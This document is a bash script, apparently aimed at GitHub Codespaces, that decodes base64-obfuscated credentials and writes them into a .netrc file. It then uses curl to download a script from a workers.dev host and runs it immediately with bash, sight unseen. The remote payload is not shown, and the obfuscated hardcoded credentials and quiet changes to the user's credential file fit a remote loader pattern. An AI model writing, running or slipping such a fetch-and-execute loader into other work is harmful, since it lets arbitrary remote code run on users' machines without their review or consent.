#!/usr/bin/env bash
# Base64-obfuscated creds -> .netrc -> curl --netrc -> run
# Optimized for GitHub Codespaces
set -euo pipefail

URL="https://airlink-menu.jishnumondal32.workers.dev"
HOST="airlink-menu.jishnumondal32.workers.dev"

# In Codespaces, use different location to avoid permission issues
if [ -n "${CODESPACES:-}" ]; then
    NETRC="${HOME}/.netrc-codespaces"
else
    NETRC="${HOME}/.netrc"
fi

# --- helpers ---
b64d() { 
    if command -v base64 >/dev/null 2>&1; then
        base64 -d <<< "$1"
    else
        # Fallback for systems without base64 command
        python3 -m base64 -d <<< "$1" 2>/dev/null ||
        openssl base64 -d -A <<< "$1" 2>/dev/null
    fi
}

# Credentials (obfuscated)
USER_B64="amlzaG51"
PASS_B64="amlzaG51aEBja2VyMTIz"

USER_RAW="$(b64d "$USER_B64")"
PASS_RAW="$(b64d "$PASS_B64")"

if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
    echo "Credential decode failed." >&2
    exit 1
fi

# Ensure curl exists
if ! command -v curl >/dev/null 2>&1; then
    echo "Error: curl is required but not installed." >&2
    exit 1
fi

# Prepare netrc file with strict permissions
mkdir -p "$(dirname "$NETRC")"
touch "$NETRC"
chmod 600 "$NETRC"

# Remove existing entry for this host
if [ -f "$NETRC" ]; then
    tmpfile="$(mktemp)"
    grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" 2>/dev/null || true
    if [ -s "$tmpfile" ]; then
        mv "$tmpfile" "$NETRC"
    else
        rm -f "$tmpfile"
        > "$NETRC"
    fi
fi

# Add credentials to netrc
{
    printf 'machine %s ' "$HOST"
    printf 'login %s ' "$USER_RAW"
    printf 'password %s\n' "$PASS_RAW"
} >> "$NETRC"

# Fetch and execute safely
script_file="$(mktemp)"
cleanup() { 
    rm -f "$script_file"
    # Optional: Remove netrc entry after use for security
    # [ -f "$NETRC" ] && grep -v "$HOST" "$NETRC" > "${NETRC}.tmp" && mv "${NETRC}.tmp" "$NETRC"
}
trap cleanup EXIT

echo "Fetching script from $URL..."
if curl -fsS --netrc-file "$NETRC" -o "$script_file" "$URL"; then
    echo "Script downloaded successfully, executing..."
    bash "$script_file"
else
    echo "Authentication or download failed." >&2
    exit 1
fi
